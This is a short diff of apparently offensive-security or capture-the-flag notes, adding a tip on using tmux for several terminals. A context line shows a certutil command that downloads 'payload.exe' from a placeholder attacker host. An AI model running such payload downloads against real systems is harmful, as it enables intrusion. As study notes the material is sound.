@@ -63,3 +63,6 @@ certutil -urlcache -f http://<lhost>/payload.exe payload.exe
 ```
 cp /path/to/file . 
 ```
+
+12) How to access multiple terminals in CLI interface ?
+We can access multiple terminals if we are only provided with a single terminal using `tmux`. 
